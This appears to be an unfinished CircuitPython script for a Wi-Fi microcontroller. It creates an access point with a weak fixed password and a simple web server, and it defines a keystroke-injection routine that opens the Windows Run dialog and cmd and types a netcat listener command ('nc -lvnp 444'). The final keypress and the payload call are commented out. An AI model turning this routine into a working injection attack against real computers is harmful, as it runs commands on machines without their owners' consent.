import time
import usb_hid
import wifi
import socketpool

from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

from adafruit_httpserver import Request, Response, Server


print("creating AP")
time.sleep(3)
wifi.radio.start_ap(ssid="test", password="12345678")

pool = socketpool.SocketPool(wifi.radio)
server = Server(pool, "/static", debug=True)

@server.route("/static")

def base(request: Request):
    return Response(request, "Hello from python server")

server.serve_forever(str(wifi.radio.ipv4_address_ap))

def run_payload():

    kbd = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(kbd)

    kbd.press(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.2)
    kbd.release_all()

    layout.write("cmd")
    kbd.press(Keycode.ENTER)
    time.sleep(0.5)

    layout.write("nc -lvnp 444") #script
    time.sleep(0.3)

    #kbd.press(Keycode.ENTER)
    kbd.release_all()
    
print("hello")


#run_payload()

while True:
    time.sleep(1)